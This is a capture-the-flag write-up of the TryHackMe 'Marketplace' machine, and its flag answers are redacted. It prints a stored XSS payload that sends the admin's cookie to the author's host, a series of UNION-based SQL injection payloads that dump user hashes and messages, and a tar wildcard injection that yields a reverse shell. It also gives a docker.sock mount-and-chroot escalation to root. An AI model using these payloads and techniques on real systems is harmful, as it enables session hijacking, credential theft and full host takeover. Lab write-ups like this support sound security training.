<h1 align="center"><a href="https://tryhackme.com/room/marketplace">TryHackMe Marketplace</a></h1>

<h2 align="center"><a href="https://twitter.com/0xTas">Writeup By: 0xTas</a></h2>

<p align="center">
    <a href="https://tryhackme.com/p/0xTas">
        <img alt="0xTas TryHackMe Profile" src="https://tryhackme-badges.s3.amazonaws.com/0xTas.png"></a>  
</p>


<h3 align="center">14 June 2022</h3>

---

## Description

Can you take over The Marketplace's infrastructure?

The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. <br>
He said it still has a few bugs he and his team need to iron out. Can you take advantage of this and will you be able to gain root access on his server?

---

## Questions


### What is flag 1?

I started off as usual by scanning for open ports using Nmap: <br>

`tas@kali$ nmap -vv -sC -sV -p- -T4 marketplace.thm -oN nmap/full.log` <br>

> 22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) <br>
> 80/tcp    open  http    syn-ack nginx 1.19.2 <br>
> |_http-title: The Marketplace <br>
> | http-robots.txt: 1 disallowed entry <br>
> |_/admin <br>
> |_http-server-header: nginx/1.19.2 <br>
> | http-methods: <br>
> |_  Supported Methods: GET HEAD POST OPTIONS <br>
> 32768/tcp open  http    syn-ack Node.js (Express middleware) <br>
> |_http-title: The Marketplace <br>
> | http-robots.txt: 1 disallowed entry <br>
> |_/admin <br>
> | http-methods: <br>
> |_  Supported Methods: GET HEAD POST OPTIONS <br>

Looks like we're working with SSH, and a webserver. <br>

Nmap also found robots.txt, and the endpoint it references: '/admin'. <br>

Next I started scanning the webserver with Gobuster and Nikto: <br>

`tas@kali$ gobuster dir -u http://marketplace.thm -w /usr/share/wordlists/dirbuster/directory-listing-2.3-medium.txt` <br>

`tas@kali$ nikto -h http://marketplace.thm` <br>

Nikto did not find anything interesting but Gobuster found several endpoints: <br>

![Gobuster results](https://i.imgur.com/JguDHfK.png)

While the Gobuster scan was running I visited the homepage of the website. It was a very simple page with a couple of product listings. <br>

![Marketplace homepage](https://i.imgur.com/ylCV49l.png)

Aside from viewing the page for each listing, most endpoints just redirected me to the login page.
I tried the obligatory "admin admin" and "admin password" to sign in, but received a message that the username was incorrect. <br>
Next I tried to login using the username "jake", which I had seen on one of the listings. This time the error I received was that my password choice was wrong, meaning jake was a valid user. <br>

Not wanting to immediately try brute-forcing the login, I decided to visit the sign up page first and make my own account. <br>
After providing a username and password, I was able to sign in on the marketplace. <br>

After logging in, I had 2 new links on the page that I could access: "New Listing", and "Messages". <br>
I had seen on one of the listing pages that I could contact the listing author, or report the listing. <br>

I tried sending a message to the Jake user, but didn't receive anything in return. 
Then, I tried reporting their cactus listing, and it brought me to my inbox where I had a new message from "system": <br>

![system message](https://i.imgur.com/Jkt9qEn.png)

This was interesting to me, but since I couldn't add any info to my report, I didn't think much of it at first. <br>

I poked around the website a bit more, checking out /robots.txt which disallowed an endpoint called "/admin".
When I visited the /admin endpoint, I was met with an error message saying that I was not authorized to view that page. <br>

This made me wonder if there might be a cookie in use that identifies me as not an admin, so I opened my developer tools and checked.
I did have a cookie for the site, and the format was familiar to me, it looked like a Json Web Token, or JWT. <br>

I copied the value of the cookie and pasted it into a [JWT debugger](https://jwt.io/#debugger-io), and sure enough it was one. <br>

![JSON Web Token Decoded](https://i.imgur.com/OPT18EB.png)

The JWT had an admin field which was set to false. Because of the way that JWTs work, I can't just set the value to true and re-send the token.
It is potentially possible to attack the algorithm used to sign the token, but I figured it would be easier to try getting ahold of an admin's token. <br>

I navigated back to my inbox, and noticed that I had received another new message: <br>

![new marketplace message](https://i.imgur.com/4Cx7bQy.png)

Another message from system, this time informing me that the listing I reported had been reviewed, and no action was taken. <br>
This piqued my interest, because it probably meant that the server-side code would navigate to a listing after we report it.
I thought that I might be able to take advantage of this and steal an admin JWT with some cross-site-scripting.. <br>

The next thing I did was create a listing. There was a button to upload a file, but it was greyed-out and had been disabled "due to security reasons". <br>

I wanted to check and see if the title and description fields were vulnerable to XSS, so I entered a basic alert script into both of them: <br>

As soon as I saved the listing, I got the javascript alert popup on my page. <br>

![Listing vulnerable to XSS](https://i.imgur.com/ZNJHnSi.png)

Sweet, so if I could craft an XSS payload to steal the user's JWT, I might be able to grab the system's admin JWT for myself. <br>

With this in mind I Googled "cookie stealing with xss" and found [this resource](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md) with helpful info and payloads. <br>

The payload I decided to try uses an image tag with the "onerror" property to send the victim's cookie to a webserver that I control. <br>
I used the version without the infite loop problem, and modified it to reflect back to my IP. <br>

The final payload looked like this: `"<img src=x onerror="this.src=-'http://10.2.2.70/?'+document.cookie; this.removeAttribute('onerror');">"`. <br>

I made another listing, and pasted the payload into both the title and description box. <br>

Before submitting the listing, I spun up a python3 simple http server to catch and view the request. I submitted the listing and checked my terminal: <br>

![JWT Stealing With XSS](https://i.imgur.com/8P74Exb.png)

The payload worked. My own JWT was sent to my http server in a GET request! Next, I needed to try reporting my own listing to see if I could steal the system's token. <br>

Once I reported the listing, my webserver caught another request from the Marketplace's IP, complete with another token.
Pasting it into the JWT debugger, I could see that it actually was the admin's token! <br>

![Admin's JWT Payload](https://i.imgur.com/5NCITeQ.png)

I went back to the marketplace and opened my browser's developer tools. I changed the value of my session cookie to Michael's admin token and requested the "/admin" page. This time it worked. <br>

![Marketplace Administration Panel](https://i.imgur.com/0d0LUE7.png)


> Answer: THM{c3*********************d5} <br>

---

### What is flag 2? (user.txt)

I started looking around the website with my newfound admin privileges, but it seemed like the only new thing I had access to was the very simple administration panel at /admin. 
I could view the signed up users, and their admin status. There was also a button to delete users but it did not actually do anything. <br>
The one thing I noticed was the structure of the URL when viewing specific users. <br>

Rather than a unique endpoint, it was using a GET parameter to specify which user's info to display. E.g. "marketplace.thm/admin?user=1". <br>

I started playing around with the URL, seeing if I could potentially leak out a file via LFI, but instead I received a very interesting error: <br>

![Informative Error Message](https://i.imgur.com/5rHNfvA.png)

So I was dealing with MySQL, then. I needed to refresh myself on SQLI Enumeration syntax, so I referenced [this resource](https://portswigger.net/web-security/sql-injection/union-attacks) by PortSwigger. <br>

The first thing I needed to do was determine the correct amount of columns that were being returned in the response. <br>
I began with the payload `?user=1 UNION SELECT NULL -- .`, and received an error about a wrong number of columns. <br>
Eventually, trying the payload: `?user=1 UNION SELECT NULL,NULL,NULL,NULL -- .`, returned with no errors, telling me the correct number of columns was 4. <br>

![SQLI Column-Amount Enumeration](https://i.imgur.com/bkmPnxR.png)

Next I needed to determine the name of the databases, tables, and columns, so I could start leaking out the data that I wanted.
I referenced the [PentestMonkey SQLI Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) for my syntax. <br>

To leak the database names, I used the following payload: <br>
`?user=7 UNION SELECT group_concat(schema_name),NULL,NULL,NULL FROM information_schema.schemata -- .` <br>

![SQLI Database-Name Enumeration](https://i.imgur.com/PUfptmG.png)

So there were 2 databases, information_schema and marketplace. Next I used a payload to find the names of the tables in the marketplace DB: <br>
`?user=7 UNION SELECT group_concat(table_schema),group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' -- .` <br>

![SLQI Database-Table Enumeration](https://i.imgur.com/0a5SbGl.png)

There were 3 tables in the DB: items, messages, and users. Now I could try getting column names from one of these tables: <br>
`?user=7 UNION SELECT group_concat(table_schema),group_concat(column_name),group_concat(table_name),NULL FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' -- .` <br>

![SQLI Database-Column Enumeration](https://i.imgur.com/RG4XUUo.png)

Now I had the names of the columns in each table, so I could start leaking the information they contained from the database. <br>
First, I targeted the password column of the users table: <br>
`?user=7 UNION SELECT username,password,id,isAdministrator FROM users WHERE username = 'jake'` <br>

![User Jake's Password Hash](https://i.imgur.com/ns43fxP.png)

After repeating this process for two other users: Michael, and System, I fed their hashes to JohnTheRipper in an attempt to crack them: <br>
`tas@kali$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt` <br>

While John was doing its thing, I went back to the vulnerable endpoint to see if there was any other interesting information that I could leak. <br>
I targeted the messages table next, since the items table didn't look like it would have anything particularly interesting: <br>

`?user=7 UNION SELECT group_concat(message_content),group_concat(user_to),group_concat(user_from),group_concat(id) FROM messages -- .` <br>

![Contents of the message table](https://i.imgur.com/FlquiOW.png)

This definitely wasn't what I expected to see, but it was very welcome because JohnTheRipper never did end up finding any matches for those hashes. <br>

That message had been sent to the user with id "3", which according to the admin panel was the user "Jake", so now I had a possible username and password combo! <br>

Remembering from my Nmap scan that the server had SSH open, I tried logging in as Jake with the credential I had found: <br>

![Initial Access via SSH](https://i.imgur.com/NRJBrjS.png)

I was able to locate user.txt in Jake's home directory: <br>

> Answer: THM{c3****************************b4}

---

### What is flag 3? (root.txt)

Next I started enumerating looking for potential vectors to escalate my privileges. <br>
One of the first commands I ran was `sudo -l`, which showed that I could run a script called `backup.sh` in `/opt/backups` as the Michael user. <br>

![Privesc Enumeration with sudo -l](https://i.imgur.com/GDYsKKs.png)

I used `cat` to check the contents of this script: <br>

![Contents of /opt/backups/backup.sh](https://i.imgur.com/NcARx5b.png)

I had no idea if this script's syntax was vulnerable in any way, but I wanted to make sure, so I Googled "tar script exploit" which surprisingly brought me straight to [__this resource__](https://mqt.gitbook.io/oscp-notes/tar-wildcard-injection). <br>

![Tar script wildcard injection Google](https://i.imgur.com/pyVkdq5.png)

This usage of the `tar` command is vulnerable to arbitrary code execution and privelege escalation when invoked with higher privileges such as root. <br>
I could not run the script as root with sudo, but I could run it as the Michael user, making a lateral escalation potentially possible. <br>

Exploitation works by creating two files with names that correspond to specific `tar` command flags. <br>
The program will encounter the files when trying to compress * (anything), and it will treat the filenames as if the command had been invoked with those flags as that higher-privileged user. <br>

The flags that I needed to use were the `--checkpoint` and `--checkpoint-action` flags. I referenced tar's man-page to get a better idea of what these would do: <br>

![tar Man Page Checkpoint Flags](https://i.imgur.com/O1etwNQ.png)

First, I created a script in the same directory (`rev.sh`), which contained a bash reverse shell paylaod.
Then I tried to create the two checkpoint files. Because of the way they needed to be named, I had to try a couple different methods to successfully create the files without errors: <br>

![Required syntax for creating checkpoint files](https://i.imgur.com/GNuz1FA.png)

Next I prepared a netcat listener in another terminal, and ran the `backup.sh` script with sudo: <br>
`jake@the-marketplace$ sudo -u michael ./backup.sh` <br>

The backup script hung, and my netcat listener caught the new shell as the Michael user. <br>
I then used Python3 to stabilize my shell with the following process: <br>

> `$ python3 -c "import pty; pty.spawn('/bin/bash')"` <br>
> ctrl+z to background the reverse shell.. <br>
> `tas@kali$ stty raw -echo` <br>
> `tas@kali$ fg` <br>
> pressing enter once or twice.. <br>
> `michael@the-marketplace$ export TERM=xterm` <br>

After that, I decided to grab a copy of [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) from my attacking machine. <br>
Running the script, it showed me that the Michael user was part of the Docker group, but more specifically, I had write permissions on the docker.sock file. <br>

![Linpeas Output](https://i.imgur.com/ELm9l6X.png)

Unfortunately the links that Linpeas had to elaborate on the issue were dead, but I was able to locate where [the HackTricks page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-docker-socket) had been moved to. <br>

![Writable Docker Socket Privilege Escalation](https://i.imgur.com/01NVGJL.png)

Using the commands listed on the HackTricks page, I attempted to escalate my privileges: <br>
`michael@the-marketplace$ docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash` <br>

However, this failed, because the Docker image for Ubuntu could not be found locally or downloaded (the box does not have internet access). <br>
Because of this, I needed to use a different Docker image for the command to work, so I ran `$ docker images` to see what was already on the machine. <br>
Luckily, the server had a copy of an Alpine Docker image, Alpine is another ditribution of Linux, so it should work just fine for this purpose. <br>

After modifying my docker commands, I was able to escalate my privileges to root. <br>

![Docker Privilege Escalation](https://i.imgur.com/CXtqSrq.png)

From there I could `# cat /root/root.txt`. <br>

> Answer: THM{d4***************************62}

---

This was a fun challenge. <br>
I learned a lot about SQL injection, stealing cookies/tokens with XSS, a relatively obscure vulnerability in the tar command, and privilege escalation via the Docker group. <br>
